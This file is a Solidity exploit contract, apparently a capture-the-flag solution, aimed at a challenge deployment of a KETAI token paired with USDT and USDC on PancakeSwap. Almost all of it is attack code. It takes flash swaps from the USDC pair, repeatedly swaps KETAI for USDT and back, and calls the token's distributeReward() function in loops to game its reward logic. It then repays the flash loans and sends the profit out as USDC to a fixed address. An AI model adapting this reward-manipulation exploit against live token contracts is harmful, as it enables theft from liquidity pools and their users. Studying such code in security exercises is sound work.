pragma solidity 0.8.20;

import "./ERC20.sol";
import "./PancakeSwap/PancakePair.sol";
import "./PancakeSwap/PancakeRouter.sol";
import "./PancakeSwap/PancakeFactory.sol";
import {console} from "forge-std/Console.sol";

interface IChallenge {
  function usdt() external returns (IERC20V);
  function usdc() external returns (IERC20V);
  function ketai() external returns (IERC20V);
  function ketaiUSDTPair() external returns (IPancakePair);
  function ketaiUSDCPair() external returns (IPancakePair);
  function router() external returns (IPancakeRouter02);
}

contract Exp {
  IERC20V USDT;
  IERC20V USDC;
  IERC20V KETAI;
  IPancakePair usdtPair;
  IPancakePair usdcPair;
  IPancakeRouter02 router;

  function run(address challenge, uint round) public {
    USDT = IChallenge(challenge).usdt();
    USDC = IChallenge(challenge).usdc();
    KETAI = IChallenge(challenge).ketai();
    usdtPair = IChallenge(challenge).ketaiUSDTPair();
    usdcPair = IChallenge(challenge).ketaiUSDCPair();
    router = IChallenge(challenge).router();

    if (round == 0) {
      for (uint256 i = 0; i < 2; i++) {
        uint256 ketaiBalance = KETAI.balanceOf(address(usdcPair));
        if (usdcPair.token1() == address(KETAI))
          usdcPair.swap(0, ketaiBalance - 1, address(this), " ");
        else
          usdcPair.swap(ketaiBalance - 1, 0, address(this), " ");
      }

      // beLP();
      console.log("Ketai in pool = ", KETAI.balanceOf(address(usdtPair)));

      for (uint256 i = 0; i < 1; i++) {
        uint256 ketaiBalance = KETAI.balanceOf(address(usdcPair));
        if (usdcPair.token1() == address(KETAI))
          usdcPair.swap(0, ketaiBalance - 1, address(this), " ");
        else
          usdcPair.swap(ketaiBalance - 1, 0, address(this), " ");
      }

      for (uint256 i = 0; i < 8; i++)
        pancakeCall(address(this), 0, 0, "");
    } else {
      for (uint256 i = 0; i < 12; i++)
        pancakeCall(address(this), 0, 0, "");
      swapUSDC();

    }

  }

  function swapUSDC() public {
    address[] memory path = new address[](2);
    path[0] = address(KETAI);
    path[1] = address(USDC);
    uint256 swapAmount = KETAI.balanceOf(address(this));
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        swapAmount,
        0,
        path,
        address(0xf2331a2d),
        block.timestamp
    );

    console.log(USDC.balanceOf(address(0xf2331a2d)));
  }

  function distribute() public {
    for (uint256 i = 0; i < 10; i++) {
      (bool success, ) = address(KETAI).call(abi.encodeWithSignature("distributeReward()"));
      require(success, "Distribute failed");
    }
  }

  function pancakeCall(address operator, uint256 amount0Out, uint256 amount1Out, bytes memory data) public {
    console.log("");
    console.log("------------------------------");
    address[] memory path = new address[](2);
    KETAI.approve(address(router), 1e60);
    USDT.approve(address(router), 1e60);

    uint256 repay = amount0Out > 0 ? amount0Out * 10031 / 10000 : amount1Out * 10031 / 10000;
    console.log("KETAI Before = ", KETAI.balanceOf(address(this)));


    uint256 swapAmount = KETAI.balanceOf(address(this)); // amount0Out > 0 ? amount0Out : amount1Out;

    path[0] = address(KETAI);
    path[1] = address(USDT);
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        swapAmount,
        0,
        path,
        address(this),
        block.timestamp
    );

    uint256 usdtBalance = USDT.balanceOf(address(this));
    console.log("USDT Balance = ", USDT.balanceOf(address(this)));

    distribute();

    path[0] = address(USDT);
    path[1] = address(KETAI);

    // uint256 tryCnt = 100;
    // for (uint i = 0; i < tryCnt; i++) {
    //   router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //       usdtBalance / tryCnt,
    //       0,
    //       path,
    //       address(this),
    //       block.timestamp
    //   );

    //   if (i != tryCnt - 1)
    //     distribute();
    // }

    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        usdtBalance ,
        0,
        path,
        address(this),
        block.timestamp
    );

    console.log("KETAI After =  ", KETAI.balanceOf(address(this)));
    console.log("KETAI After at ERC20 =  ", KETAI.balanceOf(address(KETAI)));

    if (repay > 0)
      KETAI.transfer(address(usdcPair), repay);

    console.log("KETAI After =  ", KETAI.balanceOf(address(this)));

    console.log("KETAI After at ERC20 =  ", KETAI.balanceOf(address(KETAI)));
  }
}
